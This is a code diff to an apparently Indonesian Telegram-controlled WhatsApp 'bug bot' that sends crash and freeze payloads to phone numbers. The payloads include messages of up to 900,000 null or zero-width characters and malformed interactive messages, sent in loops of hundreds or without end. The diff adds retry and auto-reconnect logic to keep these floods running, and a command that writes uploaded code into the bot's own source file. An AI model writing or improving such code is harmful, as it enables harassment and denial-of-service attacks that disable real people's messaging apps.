@@ -157,6 +157,91 @@ const getUptime = () => {
 
 const sleep = (ms) => new Promise(resolve => setTimeout(resolve, ms));
 
+// Fungsi cek koneksi socket
+async function isSocketConnected(sock) {
+  try {
+    if (!sock || !sock.user) return false;
+    const state = sock.ev.emit('connection.update', {});
+    return true;
+  } catch {
+    return false;
+  }
+}
+
+// Fungsi kirim pesan dengan retry dan reconnect
+async function safeSendMessage(sock, target, messageFunc, retries = 3) {
+  for (let i = 0; i < retries; i++) {
+    try {
+      if (!sock || !sock.user) {
+        console.log(`⚠️ Socket tidak valid, cari sesi baru...`);
+        const newSock = await getValidSocket();
+        if (newSock) {
+          sock = newSock;
+        } else {
+          await sleep(2000);
+          continue;
+        }
+      }
+      await messageFunc(sock, target);
+      return true;
+    } catch (error) {
+      console.log(`❌ Gagal kirim (attempt ${i + 1}/${retries}):`, error.message);
+      if (error.message?.includes('Connection Closed') || error.output?.statusCode === 428) {
+        console.log(`🔄 Koneksi terputus, mencoba reconnect...`);
+        const newSock = await reconnectAnySession();
+        if (newSock) {
+          sock = newSock;
+        }
+      }
+      await sleep(2000);
+    }
+  }
+  return false;
+}
+
+async function getValidSocket() {
+  if (sessions.size > 0) {
+    for (const [number, sock] of sessions) {
+      try {
+        if (sock && sock.user) {
+          return sock;
+        }
+      } catch (e) {}
+    }
+  }
+  return null;
+}
+
+async function reconnectAnySession() {
+  try {
+    if (!fs.existsSync(SESSIONS_DIR)) return null;
+    const { state, saveCreds } = await useMultiFileAuthState(SESSIONS_DIR);
+    const sock = makeWASocket({
+      auth: state,
+      printQRInTerminal: false,
+      logger: P({ level: "silent" }),
+      defaultQueryTimeoutMs: undefined,
+      keepAliveIntervalMs: 60000,
+      connectTimeoutMs: 60000,
+    });
+    
+    return new Promise((resolve) => {
+      const timeout = setTimeout(() => resolve(null), 15000);
+      sock.ev.once("connection.update", (update) => {
+        clearTimeout(timeout);
+        if (update.connection === "open") {
+          resolve(sock);
+        } else {
+          resolve(null);
+        }
+      });
+    });
+  } catch (error) {
+    console.error("Reconnect error:", error);
+    return null;
+  }
+}
+
 // Middleware untuk cek group only
 function checkGroupOnlyMiddleware(ctx, next) {
   const groupOnlyMode = loadGroupOnly();
@@ -451,75 +536,98 @@ async function connectToWhatsApp(botNumber, chatId) {
 // ================= BUG FUNCTIONS (SEMUA DIKIRIM KE TARGET) ================= //
 
 async function VsxCrashDelay(sock, target) {
-  await sock.sendMessage(target, { text: "\u0000".repeat(900000) });
+  await safeSendMessage(sock, target, async (s, t) => {
+    await s.sendMessage(t, { text: "\u0000".repeat(900000) });
+  });
 }
 
 async function DelayHard(sock, target) {
-  await sock.sendMessage(target, { text: "x".repeat(800000) });
+  await safeSendMessage(sock, target, async (s, t) => {
+    await s.sendMessage(t, { text: "x".repeat(800000) });
+  });
 }
 
 async function StickerFC(sock, target) {
-  await sock.sendMessage(target, { sticker: { url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true" } });
+  await safeSendMessage(sock, target, async (s, t) => {
+    await s.sendMessage(t, { sticker: { url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true" } });
+  });
 }
 
 async function Freeze(sock, target) {
-  await sock.relayMessage(target, {
-    viewOnceMessage: {
-      message: {
-        interactiveResponseMessage: {
-          body: { text: "FREEZE", format: "DEFAULT" },
-          nativeFlowResponseMessage: {
-            name: "cta_FREEZE",
-            paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(500000)}\"}}`,
-            version: 3
+  await safeSendMessage(sock, target, async (s, t) => {
+    await s.relayMessage(t, {
+      viewOnceMessage: {
+        message: {
+          interactiveResponseMessage: {
+            body: { text: "FREEZE", format: "DEFAULT" },
+            nativeFlowResponseMessage: {
+              name: "cta_FREEZE",
+              paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(500000)}\"}}`,
+              version: 3
+            }
           }
         }
       }
-    }
-  }, { participant: { jid: target } });
+    }, { participant: { jid: t } });
+  });
 }
 
 async function invisfcmsg(sock, target) {
-  await sock.sendMessage(target, { text: "\u200b".repeat(800000) });
+  await safeSendMessage(sock, target, async (s, t) => {
+    await s.sendMessage(t, { text: "\u200b".repeat(800000) });
+  });
 }
 
 async function VnXDelayXFcNew(sock, target) {
-  await sock.relayMessage(target, {
-    viewOnceMessage: {
-      message: {
-        interactiveResponseMessage: {
-          body: { text: "VnX", format: "DEFAULT" },
-          nativeFlowResponseMessage: {
-            name: "cta_VnX",
-            paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900009)}\"}}`,
-            version: 3,
-            contextInfo: {
-              isForwarded: true,
-              forwardingScore: 999,
-              quotedMessage: {
-                stickerMessage: {
-                  url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
-                  fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
-                  fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
-                  mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
-                  mimetype: "image/webp",
-                  directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
-                  fileLength: "10610",
-                  mediaKeyTimestamp: "1775044724",
-                  stickerSentTs: "1775044724091"
+  await safeSendMessage(sock, target, async (s, t) => {
+    await s.relayMessage(t, {
+      viewOnceMessage: {
+        message: {
+          interactiveResponseMessage: {
+            body: { text: "VnX", format: "DEFAULT" },
+            nativeFlowResponseMessage: {
+              name: "cta_VnX",
+              paramsJson: `{\"flow_cta\":\"${"\u0000".repeat(900009)}\"}}`,
+              version: 3,
+              contextInfo: {
+                isForwarded: true,
+                forwardingScore: 999,
+                quotedMessage: {
+                  stickerMessage: {
+                    url: "https://mmg.whatsapp.net/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c&mms3=true",
+                    fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
+                    fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
+                    mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
+                    mimetype: "image/webp",
+                    directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
+                    fileLength: "10610",
+                    mediaKeyTimestamp: "1775044724",
+                    stickerSentTs: "1775044724091"
+                  }
                 }
               }
             }
           }
         }
       }
-    }
-  }, { participant: { jid: target } });
+    }, { participant: { jid: t } });
+  });
 }
 
 async function delaynewinvisibleVnX(sock, target) {
   while (true) {
-    try {   
+    try {
+      if (!sock || !sock.user) {
+        console.log(`⚠️ Koneksi putus, reconnect...`);
+        const newSock = await reconnectAnySession();
+        if (newSock) {
+          sock = newSock;
+        } else {
+          await sleep(5000);
+          continue;
+        }
+      }
+      
       const MsgNew = {
         groupStatusMessageV2: {
           message: {
@@ -541,19 +649,29 @@ async function delaynewinvisibleVnX(sock, target) {
 
       await sock.relayMessage(target, MsgNew, { participant: { jid: target } });
       
-      console.log(` VnX Sent to ${target}`);
-      await new Promise(resolve => setTimeout(resolve, 1200));
+      console.log(`✅ VnX Sent to ${target}`);
+      await sleep(1200);
 
     } catch (e) {
-      console.log("Error:", e);
-      await new Promise(resolve => setTimeout(resolve, 5000));
+      console.log("❌ Error:", e.message);
+      if (e.message?.includes('Connection Closed') || e.output?.statusCode === 428) {
+        console.log(`🔄 Mencoba reconnect...`);
+        const newSock = await reconnectAnySession();
+        if (newSock) {
+          sock = newSock;
+        }
+      }
+      await sleep(5000);
     }
   }
 }
 
 async function VisiNoob(sock, target) {
   for (let i = 0; i < 50; i++) {
-    await sock.sendMessage(target, { text: "\u200e".repeat(600000) });
+    await safeSendMessage(sock, target, async (s, t) => {
+      await s.sendMessage(t, { text: "\u200e".repeat(600000) });
+    });
+    await sleep(100);
   }
 }
 
@@ -836,7 +954,8 @@ async function addNewFunctionToFile(functionBody, functionName) {
       }
     }
     
-    const functionCode = functionBody + '\n\n';
+    const finalFunctionBody = functionBody.includes('async function') ? functionBody : `async ${functionBody}`;
+    const functionCode = finalFunctionBody + '\n\n';
     lines.splice(lastFunctionLine + 1, 0, functionCode);
     
     fs.writeFileSync(__filename, lines.join('\n'));
@@ -899,7 +1018,9 @@ bot.onText(/\\/${cmdName}(?:\\s+(.+))?/, async (msg, match) => {
     });
     
     for (let i = 0; i < ${loopCount}; i++) {
-      await ${functionName}(sock, target);
+      await safeSendMessage(sock, target, async (s, t) => {
+        await ${functionName}(s, t);
+      });
       await sleep(${sleepMs});
       console.log(chalk.green(\`✅ Success Sending to \${target}\`));
     }
@@ -941,6 +1062,7 @@ bot.onText(/\\/${cmdName}(?:\\s+(.+))?/, async (msg, match) => {
   }
 }
 
+// Fitur /addfunccmd dengan dukungan reply file ATAU langsung teks
 bot.onText(/\/addfunccmd(?:\s+(.+))?/, async (msg, match) => {
   const chatId = msg.chat.id;
   if (!isOwner(msg.from.id)) {
@@ -948,14 +1070,15 @@ bot.onText(/\/addfunccmd(?:\s+(.+))?/, async (msg, match) => {
     return;
   }
   
+  // Cek apakah ada parameter
   if (!match || !match[1]) {
-    await bot.sendMessage(chatId, "❌ Format: /addfunccmd <cmdName>,<loopCount>,<sleepMs>,<functionName>\n\nCara: Reply ke file .js yang berisi fungsi, lalu ketik perintah ini.\nContoh: /addfunccmd xspam,3,1000,DelayKelrax");
+    await bot.sendMessage(chatId, "❌ Format: /addfunccmd <cmdName>,<loopCount>,<sleepMs>,<functionName>\n\nCara 1 (Reply file .js):\nKirim file .js, lalu reply file tersebut dengan perintah ini.\n\nCara 2 (Langsung):\nKirim fungsi sebagai teks, lalu reply pesan fungsi tersebut dengan perintah ini.\n\nContoh: /addfunccmd xspam,3,1000,DelayKelrax");
     return;
   }
   
   const args = match[1].split(',');
   if (args.length < 4) {
-    await bot.sendMessage(chatId, "❌ Format: /addfunccmd <cmdName>,<loopCount>,<sleepMs>,<functionName>\n\nCara: Reply ke file .js yang berisi fungsi, lalu ketik perintah ini.\nContoh: /addfunccmd xspam,3,1000,DelayKelrax");
+    await bot.sendMessage(chatId, "❌ Format: /addfunccmd <cmdName>,<loopCount>,<sleepMs>,<functionName>\n\nContoh: /addfunccmd xspam,3,1000,DelayKelrax");
     return;
   }
   
@@ -969,67 +1092,91 @@ bot.onText(/\/addfunccmd(?:\s+(.+))?/, async (msg, match) => {
     return;
   }
   
-  if (!msg.reply_to_message || !msg.reply_to_message.document) {
-    await bot.sendMessage(chatId, "❌ Reply ke file .js yang berisi fungsi!\n\nKirim file .js, lalu reply file tersebut dengan perintah /addfunccmd");
+  let functionBody = null;
+  let source = "";
+  
+  // Cek apakah reply ke file atau ke text message
+  if (msg.reply_to_message) {
+    if (msg.reply_to_message.document) {
+      // Reply ke file .js
+      const fileId = msg.reply_to_message.document.file_id;
+      const fileName = msg.reply_to_message.document.file_name;
+      
+      if (!fileName.endsWith('.js')) {
+        await bot.sendMessage(chatId, "❌ File harus berekstensi .js");
+        return;
+      }
+      
+      source = "file";
+      await bot.sendMessage(chatId, `🔄 Memproses file ${fileName}...`);
+      
+      try {
+        const fileLink = await bot.getFileLink(fileId);
+        const response = await axios.get(fileLink, { responseType: 'text' });
+        functionBody = response.data.trim();
+      } catch (error) {
+        await bot.sendMessage(chatId, `❌ Gagal membaca file: ${error.message}`);
+        return;
+      }
+      
+    } else if (msg.reply_to_message.text) {
+      // Reply ke pesan teks yang berisi fungsi
+      source = "text";
+      functionBody = msg.reply_to_message.text.trim();
+      await bot.sendMessage(chatId, `🔄 Memproses fungsi dari pesan teks...`);
+    }
+  }
+  
+  // Jika tidak ada reply sama sekali
+  if (!functionBody) {
+    await bot.sendMessage(chatId, "❌ Reply ke file .js ATAU ke pesan teks yang berisi fungsi!\n\nKirim file .js atau tulis fungsi, lalu reply dengan /addfunccmd");
     return;
   }
   
-  const fileId = msg.reply_to_message.document.file_id;
-  const fileName = msg.reply_to_message.document.file_name;
-  
-  if (!fileName.endsWith('.js')) {
-    await bot.sendMessage(chatId, "❌ File harus berekstensi .js");
+  // Cek apakah fungsi dengan nama yang dimaksud ada di body
+  if (!functionBody.includes(`async function ${functionName}`) && !functionBody.includes(`function ${functionName}`)) {
+    await bot.sendMessage(chatId, `❌ Fungsi dengan nama "${functionName}" tidak ditemukan di ${source === "file" ? "file" : "pesan"}!\n\nPastikan berisi:\nasync function ${functionName}(sock, target) { ... }`);
     return;
   }
   
-  await bot.sendMessage(chatId, `🔄 Memproses file ${fileName}...`);
+  // Format ulang fungsi jika perlu
+  if (!functionBody.includes('async function')) {
+    functionBody = `async ${functionBody}`;
+  }
   
-  try {
-    const fileLink = await bot.getFileLink(fileId);
-    const response = await axios.get(fileLink, { responseType: 'text' });
-    let functionBody = response.data.trim();
-    
-    if (!functionBody.includes(`async function ${functionName}`) && !functionBody.includes(`function ${functionName}`)) {
-      await bot.sendMessage(chatId, `❌ Fungsi dengan nama "${functionName}" tidak ditemukan di file!\n\nPastikan file berisi:\nasync function ${functionName}(sock, target) { ... }`);
-      return;
-    }
-    
-    if (!functionBody.includes('async function')) {
-      functionBody = `async ${functionBody}`;
-    }
-    
-    const functionAdded = await addNewFunctionToFile(functionBody, functionName);
-    
-    if (!functionAdded) {
-      await bot.sendMessage(chatId, `⚠️ Gagal menambah fungsi atau fungsi "${functionName}" sudah ada di index.js.`);
-    } else {
-      await bot.sendMessage(chatId, `✅ Fungsi "${functionName}" berhasil ditambahkan ke index.js!`);
-    }
-    
-    const commandAdded = await addNewCommand(cmdName, loopCount, sleepMs, functionName);
-    
-    if (!commandAdded) {
-      await bot.sendMessage(chatId, `❌ Gagal menambah command /${cmdName}.`);
-      return;
-    }
-    
-    await bot.sendMessage(chatId, `✅ BERHASIL MENAMBAH COMMAND BARU!
-    
+  // Tambahkan safeSendMessage wrapper ke fungsi jika belum ada
+  if (!functionBody.includes('safeSendMessage')) {
+    // Biarkan tetap original, nanti di command sudah dibungkus safeSendMessage
+  }
+  
+  const functionAdded = await addNewFunctionToFile(functionBody, functionName);
+  
+  if (!functionAdded) {
+    await bot.sendMessage(chatId, `⚠️ Gagal menambah fungsi atau fungsi "${functionName}" sudah ada di index.js.`);
+  } else {
+    await bot.sendMessage(chatId, `✅ Fungsi "${functionName}" berhasil ditambahkan ke index.js!`);
+  }
+  
+  const commandAdded = await addNewCommand(cmdName, loopCount, sleepMs, functionName);
+  
+  if (!commandAdded) {
+    await bot.sendMessage(chatId, `❌ Gagal menambah command /${cmdName}.`);
+    return;
+  }
+  
+  await bot.sendMessage(chatId, `✅ BERHASIL MENAMBAH COMMAND BARU!
+  
 📌 Command: /${cmdName}
 🔄 Loop: ${loopCount}x
 ⏱️ Sleep: ${sleepMs}ms
 ⚡ Function: ${functionName}
+📁 Source: ${source}
 
 🔄 Restarting bot dalam 3 detik...`);
-    
-    setTimeout(() => {
-      process.exit(0);
-    }, 3000);
-    
-  } catch (error) {
-    console.error("Error in addfunccmd:", error);
-    await bot.sendMessage(chatId, `❌ Error: ${error.message}\n\nPastikan file berisi fungsi yang valid.`);
-  }
+  
+  setTimeout(() => {
+    process.exit(0);
+  }, 3000);
 });
 
 // ================= FITUR BARU ================= //
@@ -1248,7 +1395,7 @@ bot.onText(/\/sanjiva(?:\s+(.+))?/, async (msg, match) => {
       return;
     }
 
-    const sock = sessions.values().next().value;
+    let sock = sessions.values().next().value;
     
     await bot.sendMessage(chatId, `✅ sanjiva (bug) selesai untuk ${formattedNumber}`, {
       parse_mode: "Markdown",
@@ -1260,7 +1407,9 @@ bot.onText(/\/sanjiva(?:\s+(.+))?/, async (msg, match) => {
     });
     
     for (let i = 0; i < 10; i++) {
-      await delaynewinvisibleVnX(sock, target);
+      await safeSendMessage(sock, target, async (s, t) => {
+        await delaynewinvisibleVnX(s, t);
+      });
       await sleep(2);
       console.log(chalk.green(`✅ Success Sending Delay to ${target}`));
     }
@@ -1305,7 +1454,7 @@ bot.onText(/\/xtest(?:\s+(.+))?/, async (msg, match) => {
       return;
     }
 
-    const sock = sessions.values().next().value;
+    let sock = sessions.values().next().value;
     
     await bot.sendMessage(chatId, `✅ xtest (bug) selesai untuk ${formattedNumber}`, {
       parse_mode: "Markdown",
@@ -1317,7 +1466,9 @@ bot.onText(/\/xtest(?:\s+(.+))?/, async (msg, match) => {
     });
     
     for (let i = 0; i < 400; i++) {
-      await StickerFC(sock, target);
+      await safeSendMessage(sock, target, async (s, t) => {
+        await StickerFC(s, t);
+      });
       await sleep(2000);
       console.log(chalk.green(`✅ Success Sending Delay to ${target}`));
     }
@@ -1362,7 +1513,7 @@ bot.onText(/\/sanjixa(?:\s+(.+))?/, async (msg, match) => {
       return;
     }
 
-    const sock = sessions.values().next().value;
+    let sock = sessions.values().next().value;
     
     await bot.sendMessage(chatId, `✅ sanjixa (bug) selesai untuk ${formattedNumber}`, {
       parse_mode: "Markdown",
@@ -1374,7 +1525,9 @@ bot.onText(/\/sanjixa(?:\s+(.+))?/, async (msg, match) => {
     });
     
     for (let i = 0; i < 3; i++) {
-      await VsxCrashDelay(sock, target);
+      await safeSendMessage(sock, target, async (s, t) => {
+        await VsxCrashDelay(s, t);
+      });
       await sleep(300);
       console.log(chalk.green(`✅ Success Sending Delay to ${target}`));
     }
@@ -1419,7 +1572,7 @@ bot.onText(/\/xfrozen(?:\s+(.+))?/, async (msg, match) => {
       return;
     }
 
-    const sock = sessions.values().next().value;
+    let sock = sessions.values().next().value;
     
     await bot.sendMessage(chatId, `✅ xfrozen (bug) selesai untuk ${formattedNumber}`, {
       parse_mode: "Markdown",
@@ -1431,7 +1584,9 @@ bot.onText(/\/xfrozen(?:\s+(.+))?/, async (msg, match) => {
     });
     
     for (let i = 0; i < 300; i++) {
-      await Freeze(sock, target);
+      await safeSendMessage(sock, target, async (s, t) => {
+        await Freeze(s, t);
+      });
       await sleep(3000);
       console.log(chalk.green(`✅ Success Sending Frezee to ${target}`));
     }
@@ -1476,7 +1631,7 @@ bot.onText(/\/stuck(?:\s+(.+))?/, async (msg, match) => {
       return;
     }
 
-    const sock = sessions.values().next().value;
+    let sock = sessions.values().next().value;
     
     await bot.sendMessage(chatId, `✅ stuck (bug) selesai untuk ${formattedNumber}`, {
       parse_mode: "Markdown",
@@ -1487,7 +1642,9 @@ bot.onText(/\/stuck(?:\s+(.+))?/, async (msg, match) => {
       }
     });
     
-    await invisfcmsg(sock, target);
+    await safeSendMessage(sock, target, async (s, t) => {
+      await invisfcmsg(s, t);
+    });
     await sleep(2000);
     
     console.log(chalk.green(`✅ Success Sending Crash to ${target}`));
@@ -1532,7 +1689,7 @@ bot.onText(/\/stunt(?:\s+(.+))?/, async (msg, match) => {
       return;
     }
 
-    const sock = sessions.values().next().value;
+    let sock = sessions.values().next().value;
     
     await bot.sendMessage(chatId, `✅ stunt (bug) selesai untuk ${formattedNumber}`, {
       parse_mode: "Markdown",
@@ -1544,7 +1701,9 @@ bot.onText(/\/stunt(?:\s+(.+))?/, async (msg, match) => {
     });
     
     for (let i = 0; i < 500; i++) {
-      await VnXDelayXFcNew(sock, target);
+      await safeSendMessage(sock, target, async (s, t) => {
+        await VnXDelayXFcNew(s, t);
+      });
       await sleep(2000);
       console.log(chalk.green(`✅ Success Sending Force Close to ${target}`));
     }
@@ -1589,7 +1748,7 @@ bot.onText(/\/streak(?:\s+(.+))?/, async (msg, match) => {
       return;
     }
 
-    const sock = sessions.values().next().value;
+    let sock = sessions.values().next().value;
     
     await bot.sendMessage(chatId, `✅ streak (bug) selesai untuk ${formattedNumber}`, {
       parse_mode: "Markdown",
@@ -1600,7 +1759,9 @@ bot.onText(/\/streak(?:\s+(.+))?/, async (msg, match) => {
       }
     });
     
-    await VisiNoob(sock, target);
+    await safeSendMessage(sock, target, async (s, t) => {
+      await VisiNoob(s, t);
+    });
     
     console.log(chalk.green(`✅ Success Sending Crash to ${target}`));
     
@@ -1667,7 +1828,7 @@ bot.onText(/\/menu/, async (msg) => {
 │ ❀ /runcmd <command>
 │ ❀ /fullupdate - update dari GitHub
 │ ❀ /cekupdate - cek update GitHub
-│ ❀ /addfunccmd - tambah cmd & fungsi dari file .js
+│ ❀ /addfunccmd - tambah cmd & fungsi (reply file ATAU teks)
 │ ❀ /updatecmd - update loop/sleep/fungsi command
 ╰═════════════════❀\`\`\``;
 
